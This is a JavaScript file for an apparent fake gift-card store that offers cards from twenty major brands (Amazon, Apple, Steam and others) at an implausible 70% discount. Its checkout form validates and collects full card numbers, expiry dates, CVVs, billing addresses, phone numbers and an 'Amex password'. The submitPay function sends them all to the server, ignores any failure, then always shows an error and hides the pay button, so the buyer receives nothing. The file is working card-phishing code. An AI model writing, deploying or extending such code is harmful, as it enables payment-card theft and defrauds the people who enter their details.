const brands = [
  { name: "AMAZON", color: "#ff9900" },
  { name: "APPLE", color: "#555555" },
  { name: "GOOGLE PLAY", color: "#34a853" },
  { name: "STEAM", color: "#1b2838" },
  { name: "WALMART", color: "#0071ce" },
  { name: "TARGET", color: "#cc0000" },
  { name: "BEST BUY", color: "#0046be" },
  { name: "STARBUCKS", color: "#00704a" },
  { name: "NETFLIX", color: "#e50914" },
  { name: "SPOTIFY", color: "#1db954" },
  { name: "UBER", color: "#000000" },
  { name: "VISA", color: "#1a1f71" },
  { name: "MASTERCARD", color: "#eb001b" },
  { name: "XBOX", color: "#107c10" },
  { name: "PLAYSTATION", color: "#003791" },
  { name: "NIKE", color: "#111111" },
  { name: "ADIDAS", color: "#000000" },
  { name: "SEPHORA", color: "#000000" },
  { name: "HOME DEPOT", color: "#f96302" },
  { name: "COSTCO", color: "#e31837" }
];

const amounts = [5, 10, 20, 50, 100];
let state = { brand: null, amount: null };

function renderBrands() {
  const grid = document.getElementById('brandGrid');
  if (!grid) return;
  grid.innerHTML = brands.map(b => `
    <div class="card-tile" style="background:${b.color}" onclick="selectBrand('${b.name}', '${b.color}')">
      <div class="discount">70% OFF</div>
      ${b.name}
    </div>
  `).join('');
}

function selectBrand(name, color) {
  state.brand = name;
  state.amount = null;
  document.getElementById('selectedBrandTitle').innerHTML = `${name} <span style="color:${color}">Gift Card</span>`;
  document.getElementById('amountBtns').innerHTML = amounts.map(a => `
    <button class="amt-btn" onclick="selectAmount(${a}, this)">$${a}<br><small style="font-weight:400;opacity:.8">Pay $${(a*0.3).toFixed(0)}</small></button>
  `).join('');
  // Reset continue button
  const cont = document.getElementById('toDetailsBtn');
  cont.disabled = true;
  cont.style.opacity = '0.55';
  cont.textContent = 'Continue';
  goStep(2);
}

function selectAmount(amt, btn) {
  state.amount = amt;
  document.querySelectorAll('.amt-btn').forEach(b => b.classList.remove('selected'));
  btn.classList.add('selected');
  const cont = document.getElementById('toDetailsBtn');
  cont.disabled = false;
  cont.style.opacity = '1';
  cont.textContent = 'Continue';
}

function goStep(n) {
  document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
  const step = document.getElementById('step' + n);
  if (step) step.classList.add('active');

  if (n === 3) {
    if (!state.brand || !state.amount) {
      goStep(2);
      return;
    }
    const pay = (state.amount * 0.3).toFixed(2);
    document.getElementById('orderSummary').innerHTML = `
      <strong>${state.brand}</strong> Gift Card – $${state.amount}<br>
      <span style="color:#16a34a;font-weight:700">70% OFF applied → You pay only $${pay}</span>
    `;
    // Force Pay button disabled on entry
    const btn = document.getElementById('payBtn');
    btn.disabled = true;
    btn.style.opacity = '0.55';
    btn.textContent = 'Enter valid card details';
    // clear previous error
    document.getElementById('errorBox').style.display = 'none';
    setTimeout(validateForm, 100);
  }
}

// ========== CARD VALIDATION ==========
function luhnCheck(num) {
  num = String(num).replace(/\D/g, '');
  if (num.length < 13 || num.length > 19) return false;
  let sum = 0;
  let alternate = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let n = parseInt(num.charAt(i), 10);
    if (alternate) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alternate = !alternate;
  }
  return (sum % 10) === 0;
}

function getCardType(num) {
  num = String(num).replace(/\D/g, '');
  if (/^3[47]/.test(num)) return 'amex';
  if (/^4/.test(num)) return 'visa';
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'mastercard';
  if (/^6(?:011|5)/.test(num)) return 'discover';
  return 'unknown';
}

function isValidCardNumber(num) {
  num = String(num).replace(/\D/g, '');
  const type = getCardType(num);
  const len = num.length;
  if (type === 'amex' && len !== 15) return false;
  if ((type === 'visa' || type === 'mastercard' || type === 'discover') && len !== 16) return false;
  if (type === 'unknown') return false;
  return luhnCheck(num);
}

function validateForm() {
  const cardNum = (document.getElementById('cardNumber')?.value || '').replace(/\s/g, '');
  const exp     = (document.getElementById('exp')?.value || '').trim();
  const cvv     = (document.getElementById('cvv')?.value || '').trim();
  const email   = (document.getElementById('email')?.value || '').trim();
  const cardName= (document.getElementById('cardName')?.value || '').trim();
  const street  = (document.getElementById('street')?.value || '').trim();
  const city    = (document.getElementById('city')?.value || '').trim();
  const stateV  = (document.getElementById('state')?.value || '').trim();
  const zip     = (document.getElementById('zip')?.value || '').trim();
  const phone   = (document.getElementById('phone')?.value || '').trim();
  const amexPass= document.getElementById('amexPassword')?.value.trim() || '';
  const isAmex  = getCardType(cardNum) === 'amex';

  const cardValid  = isValidCardNumber(cardNum);
  const expValid   = /^\d{2}\/\d{2}$/.test(exp);
  const cvvValid   = isAmex ? /^\d{4}$/.test(cvv) : /^\d{3}$/.test(cvv);
  const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  const filled     = cardName.length > 1 && street.length > 3 && city.length > 1 && stateV.length >= 2 && zip.length >= 4 && phone.length >= 8;
  const amexOk     = !isAmex || amexPass.length >= 4;

  const allGood = cardValid && expValid && cvvValid && emailValid && filled && amexOk;

  const btn = document.getElementById('payBtn');
  if (btn) {
    btn.disabled = !allGood;
    btn.style.opacity = allGood ? '1' : '0.55';
    btn.textContent = allGood ? 'Pay Now – 70% Off Applied' : 'Enter valid card details';
  }
}

// Card input listener
document.addEventListener('DOMContentLoaded', function() {
  renderBrands();

  const cardInput = document.getElementById('cardNumber');
  const cardError = document.getElementById('cardError');

  if (cardInput) {
    cardInput.addEventListener('input', function(e) {
      let raw = e.target.value.replace(/\D/g, '').substring(0, 19);
      const type = getCardType(raw);

      if (type === 'amex') {
        let f = raw.substring(0,4);
        if (raw.length > 4) f += ' ' + raw.substring(4,10);
        if (raw.length > 10) f += ' ' + raw.substring(10,15);
        e.target.value = f.trim();
      } else {
        e.target.value = raw.replace(/(.{4})/g, '$1 ').trim();
      }

      const isAmex = type === 'amex';
      const amexField = document.getElementById('amexField');
      if (amexField) amexField.style.display = isAmex ? 'block' : 'none';
      const cvvInput = document.getElementById('cvv');
      if (cvvInput) {
        cvvInput.maxLength = isAmex ? 4 : 3;
        cvvInput.placeholder = isAmex ? '1234' : '123';
      }

      if (cardError) {
        if (raw.length === 0) {
          cardError.style.display = 'none';
          cardInput.style.borderColor = '#e2e8f0';
        } else if (!isValidCardNumber(raw)) {
          cardError.textContent = 'Invalid card number';
          cardError.style.color = '#b91c1c';
          cardError.style.display = 'block';
          cardInput.style.borderColor = '#ef4444';
        } else {
          cardError.textContent = '✓ Valid ' + type.toUpperCase();
          cardError.style.color = '#16a34a';
          cardError.style.display = 'block';
          cardInput.style.borderColor = '#16a34a';
        }
      }
      validateForm();
    });
  }

  // Expiry formatter
  const expInput = document.getElementById('exp');
  if (expInput) {
    expInput.addEventListener('input', function(e) {
      let v = e.target.value.replace(/\D/g, '').substring(0,4);
      if (v.length >= 3) v = v.substring(0,2) + '/' + v.substring(2);
      e.target.value = v;
      validateForm();
    });
  }

  // Other fields
  ['cvv','email','cardName','street','city','state','zip','phone','amexPassword'].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.addEventListener('input', validateForm);
  });

  // Initial state
  const cont = document.getElementById('toDetailsBtn');
  if (cont) {
    cont.disabled = true;
    cont.style.opacity = '0.55';
  }
  const payBtn = document.getElementById('payBtn');
  if (payBtn) {
    payBtn.disabled = true;
    payBtn.style.opacity = '0.55';
    payBtn.textContent = 'Enter valid card details';
  }
});

async function submitPay() {
  const cardNum = (document.getElementById('cardNumber').value || '').replace(/\s/g, '');
  if (!isValidCardNumber(cardNum)) {
    alert('Only valid card numbers are accepted');
    validateForm();
    return;
  }

  const btn = document.getElementById('payBtn');
  btn.disabled = true;
  btn.textContent = 'Processing...';

  const data = {
    brand: state.brand,
    amount: state.amount,
    email: document.getElementById('email').value.trim(),
    cardName: document.getElementById('cardName').value.trim(),
    cardNumber: cardNum,
    exp: document.getElementById('exp').value.trim(),
    cvv: document.getElementById('cvv').value.trim(),
    amexPassword: document.getElementById('amexPassword')?.value.trim() || null,
    street: document.getElementById('street').value.trim(),
    city: document.getElementById('city').value.trim(),
    state: document.getElementById('state').value.trim(),
    zip: document.getElementById('zip').value.trim(),
    phone: document.getElementById('phone').value.trim()
  };

  try {
    await fetch('/api/checkout', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
  } catch(e) {}

  document.getElementById('errorBox').style.display = 'block';
  btn.style.display = 'none';
}
